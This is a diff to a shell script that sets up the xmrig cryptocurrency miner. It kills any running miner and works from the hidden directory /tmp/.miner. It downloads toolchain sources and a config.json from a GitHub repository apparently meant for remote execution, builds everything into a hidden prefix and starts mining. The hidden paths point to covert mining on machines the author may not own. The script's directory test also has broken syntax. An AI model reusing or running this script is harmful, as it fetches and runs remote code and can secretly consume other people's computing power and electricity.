@@ -1,10 +1,54 @@
+USRLOCAL=$HOME/.usrlocal
+PATH=$USRLOCAL/bin:$PATH
+
 killall xmrig
+
 if [ -d "/tmp/.miner"]; then
-else
-	mkdir /tmp/.miner
+	rm -rf /tmp/.miner
 fi
-curl https://raw.githubusercontent.com/Aleks4ndr/zsh_remote_script/main/miner.zip -o /tmp/.miner/miner.zip
+
+mkdir /tmp/.miner
 cd /tmp/.miner
-unzip -o miner.zip -d miner
-cd miner/xmrig-6.12.1
-./xmrig &
+curl -LO https://github.com/Aleks4ndr/zsh_remote_script/raw/main/sources.tgz
+tar -xf sources.tgz
+
+cd cmake-3.20.2
+./bootstrap --prefix=$USRLOCAL
+make && make install
+
+cd ../libtool-2.4.6
+./configure --prefix=$USRLOCAL
+make && make install
+
+cd ../autoconf-2.69
+./configure --prefix=$USRLOCAL
+make && make install
+
+cd ../automake-1.16 
+./configure --prefix=$USRLOCAL
+make && make install
+
+cd ../libuv-v1.41.0
+mkdir build
+cd build
+cmake -DCMAKE_INSTALL_PREFIX=$USRLOCAL ..
+make && make install
+
+cd ../../wget2-1.99.2
+./configure --prefix=$USRLOCAL
+make && make install
+
+cd ..
+curl -LO https://github.com/xmrig/xmrig/archive/refs/tags/v6.12.1.tar.gz
+tar -xf v6.12.1.tar.gz
+cd xmrig-6.12.1
+
+mkdir build
+cd scripts
+./build.hwloc.sh && cd ../build
+cmake -DCMAKE_INSTALL_PREFIX=$USRLOCAL .. -DOPENSSL_ROOT_DIR=/usr/local/opt/openssl -DHWLOC_INCLUDE_DIR=../scripts/deps/include -DHWLOC_LIBRARY=../scripts/deps/lib/libhwloc.a
+make -j$(sysctl -n hw.logicalcpu)
+curl -LO https://raw.githubusercontent.com/Aleks4ndr/zsh_remote_script/main/config.json
+./xmrig
+
+
